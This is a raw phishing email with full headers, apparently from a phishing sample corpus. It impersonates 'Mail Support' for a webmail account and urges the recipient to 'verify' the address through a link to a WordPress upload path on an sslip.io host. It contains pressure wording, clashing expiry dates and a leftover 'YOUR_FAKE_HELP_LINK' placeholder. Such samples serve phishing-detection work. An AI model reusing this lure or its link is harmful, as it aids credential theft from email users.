@@ -1,0 +1,126 @@
+Return-Path: jada@adbertize.com
+Delivered-To: jose@monkey.org
+X-FDA: 84047948586.20.3C65F54
+Received: from hotel.adbertize.com (hotel.adbertize.com [188.240.14.34])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP id 96D90120009
+	for <jose@monkey.org>; Tue, 28 Oct 2025 15:45:51 +0000 (UTC)
+Authentication-Results: imf03.b.hostedemail.com;
+	dkim=pass header.d=adbertize.com header.s=dkim header.b=F3piYyMs;
+	dmarc=pass (policy=none) header.from=adbertize.com;
+	spf=pass (imf03.b.hostedemail.com: domain of jada@adbertize.com designates
+ 188.240.14.34 as permitted sender) smtp.mailfrom=jada@adbertize.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1761666351;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Zdoi4IPRO+1OQhLmPxTOmZ0G0QXqAzW2gnubLCnbwDs=;
+	b=381SepKYuTvkDUsq0cvrDMYBFaHqFEoQEYlJ+41Nw99sKrXmZX0CDI9GIOpNzgIwvcXaz6
+	cDD47k79F1pVcYKaP8uj2UNqC6/9kxJlbd9eL3l8DWtaAB1iHuGLRAFeFbNaYklPGqoxBn
+	DExk+M/cGYlMEt0CtQv+z0A+Bh6682k=
+ARC-Authentication-Results: i=1;
+	imf03.b.hostedemail.com;
+	dkim=pass header.d=adbertize.com header.s=dkim header.b=F3piYyMs;
+	dmarc=pass (policy=none) header.from=adbertize.com;
+	spf=pass (imf03.b.hostedemail.com: domain of jada@adbertize.com designates
+ 188.240.14.34 as permitted sender) smtp.mailfrom=jada@adbertize.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1761666351; a=rsa-sha256;
+	cv=none;
+	b=PCz+D4Li4QkhvRtQXbYitBoyYTU6mYu9ORWO7kbqhyKAXSFdEfgnW1X68G5xQk8+7YS9Iq
+	9pBDa6MJfvXxGLFtDqIGFVdaDHo5sCSvPsE6C8IDj1CMdcvQd2j6iYPS0p0JqdVI05ECJs
+	hVJR/n9B1R75v53t5up3WpMMwTrqGxg=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=adbertize.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=jada@adbertize.com;
+ bh=EcnvMC478uv381X/aj2/tagZy5Q=;
+ b=F3piYyMsIbRbLx0/ACdUAebOxx3gzEZcs+S/Xsv5JdIAAF9/zq0krmDc4Q8S6u+EKfOEWB0T+YNp
+   607T1JcIqN8JIrnd1EiigqZ1Igahrj1l0fwiI5FwiBtJf6pIpRkM1Eluwy9R14wYaKWRko43VFZY
+   k6XmJqUJ7wyithzkkPLOO6VhKhMuEJMnfXs/DbCmgwN+6D5Si4mn7B20ZLoeI867s6XMfrtgJXaJ
+   Fj9fDzKONAbUo7IxgMEH9XMRcpgmoqwgzik0pRqmg8Qa31e02x84tE/GsADlH6krKFVRN4vFqwu3
+   AYYQVnRb9ZkbuNwBT6eunzYBVWAgxlcVt6ucyw==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=adbertize.com;
+ b=qUHFANiHr/72kq3MSlj102AM4QCP12ubrh3o0lDR44R/VoA+Wc5XJHtVeV2gtFWdmDvVn+pAv0QO
+   aCsLRR9KPRrses0EgF0i877p1p+wOpQq+56TMMYwbuJQJZG0wPuQWY5GbaG183xCwIkKky2m0x8O
+   8F7Etcdqkm7kgiCThSaWmlW4v06iiHjYLdLNbdXb7hGheCojKdKLpKI0jYYaa51DVH4PbOJTVqNX
+   X4l2qQfqPVfM1ZZys7QGMPVpICfUBudhc5RIZFsK/I9ROqc5u0cqZA9JB1pS4ayF/M85IVYpm551
+   cbeziSxoAe0ePu7hDPzcuemVD+oAQ+rnFD1PJQ==;
+From: Mail Support monkey.org <jada@adbertize.com>
+To: jose@monkey.org
+Subject: Verify Now
+Date: 28 Oct 2025 08:45:49 -0700
+Message-ID: <20251028084549.EDA32581299FA6C3@adbertize.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 96D90120009
+X-Stat-Signature: afg3tfqwfcc3p9fj6azuyxytpunwa4e4
+X-Rspam-User: 
+X-Spam-Status: No, score=6.38
+X-Rspamd-Server: rspam04
+X-HE-Tag: 1761666351-402426
+X-HE-Meta: 
+ U2FsdGVkX1+CKUYPwJIekhAqeuoonYdIVt6CU4vk3pJ/+kDRwz8hzaFHaY2PlQvTSGPLdfFswSnKpBTD8lCyQmX81LVwv8Ar/NvsEqj0cYoqUX81ddwSR4Bcpug97boJCfCuldrN/jLCP6UoROyc1YsNLrhp25Xcffdk2AAm1WvRl3h9z3LAyvnuSuXEw6st7R38b6gtP1BKz9HDZeV3/ls8D9C1KjTgkJtfmh9iMKeioCve94o8jxWDF+AAMvmJv1ajDnou1Lhxn/8l2/PfASZnzO8idDxMF/1QlWCBbuujLpX7HpjBO0PQAjc7KqhWeS/0jDzFDWcj5PC02uuShFU6wB4qTD72dz0ygw4TMegRhjBCtRFUBOzwbU4+E93YwbANNE8fr+m3ESUOsqeAS4EnjY8oIj+z7ZBLDQKssSXhn/U44RAJwJDpe6pGTLJ4vT6XSqzgqnTCqzjKVNxji6pIEi9+AupFQt0oqHolZBnjSjnxSgw7ZCpW8w1EohuAXYI4jLvOsNotoTU7ji9S2jE7hN5Cc7m/4BYmnROvDM+aOnyWtiJOF+2u8dz8Vrf9kSTvAvM4uOlhGtj28hxVyia3wFEYRkXeNSXyA5ddKPEDSNpnqJIRvT3fxFEzhHt+WD4pKetW/QonT4td0nefGQevcdU8sAlvsuvAQ+urrs6wvAIrRPz54ryv2K0hjTfTU1zL4PJy5xon0QVybvjf4ldFK5/Hc302c9rNF7KDQ7VajSBsY9dL0R/T+yoOh3ewYg47AapEtbDuvcLF8nWQtLW06I675zEKC2Hb3Mb1mh5Sr2vfOPP35WIJ//8HWpx9ycWpl0mozD+9AXYoQ8AIWOQk2KoXteLcS7CscLpaH7JRW9b2yTRqQWHVuLjmHYyBv+LK4N04Dlw81T95EphyuIa0xIzKPPFozZN7KXrBn+tRjqqshsnV77N7wuH+IqdEJQDpv8GnUF3TLYWnDuKYjsuQXRZ
+ 2LP7aYoLzIsPCoi579A8hsR14bGO4zGxKF4yJQ7IGjXMCoOii/8C0V7LLcd8eSXX/IFYo9tD/3Y3gLOU/ia6FSXUUTNFT/IRyBznP8GvxYLntAEt43FTb/wIyjKCogfM8Si+VUW2tF7XxGp9N4t5f3OhzlVlLC/BXVUK+7bxJHQCthprW6hjecIm2m8/XZ3539KqZTQVk4WSzfKCtbxghvjACLkS+FTUbKm+6O7p0cBQsu00G2gRlByviGu8QsXDjEWpFtq9EQBIaMMxGgr7XnoamWzbMvZ/BR6aowpxOj8I2St0FO2nWFDshpkdtheV3oqA7Sfpwsk5rzMSO6B07NnXLxxiBosJhWqjhOSnqFiYqLBOUOTLCgV9kEDJ1ObdJXjSCpZNFwaKwbKlW9qiRcOp4wcgNkxLkOC2X
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 419
+
+<!DOCTYPE html>
+
+<html><head>
+<title>Webmail Verification</title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"font-family: Arial, sans-serif;">
+
+<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+<tbody><tr>
+<td align=3D"center">
+<table width=3D"582" style=3D"border: 1px solid rgb(204, 204, 204); border-=
+image: none; width: 582px; height: 582px;" cellspacing=3D"0" cellpadding=3D=
+"0">
+<tbody><tr>
+<td align=3D"left" style=3D"padding: 20px;">
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img width=3D"291" he=
+ight=3D"174" style=3D"width: 409px; height: 127px;" alt=3D"Webmail Login" s=
+rc=3D"https://encrypted-tbn0.gstatic.com/images?q=3Dtbn:ANd9GcRtJT-bTvf5bAf=
+IEIX1mx3Dnp0hOJxQ_yWVZg&amp;s"></td>
+</tr>
+<tr>
+<td style=3D"padding: 20px;">
+<h2 style=3D"color: rgb(51, 51, 51);">Verify Your jose@monkey.org Email Add=
+ress</h2>
+<p>Hello info,</p>
+<p>To continue using your jose@monkey.org please verify that this is your e=
+mail address.</p>
+<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+<tbody><tr>
+<td align=3D"center" style=3D"padding: 20px;">
+<a style=3D"padding: 15px 30px; border-radius: 5px; color: rgb(255, 255, 25=
+5); font-weight: bold; text-decoration: none; background-color: rgb(255, 11=
+9, 0);" href=3D"https://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.=
+sslip.io/wp-content/uploads/western/index.html#jose@monkey.org">Continue Ve=
+rification Here</a>
+</td>
+</tr>
+</tbody></table>
+<p style=3D"color: red;">Authentication Request To Expire on&nbsp;28 Oct 20=
+25.</p>
+<p>This link will expire 18th Oct, 2025. You might lose access to your mail=
+box if action is not taken immediately.</p>
+<p>For help, Contact us through our <a style=3D"color: rgb(0, 123, 255);" h=
+ref=3D"https://YOUR_FAKE_HELP_LINK">Help center</a>.</p>
+</td>
+</tr>
+</tbody></table>
+</td>
+</tr>
+</tbody></table>
+
+
+</body></html>
+
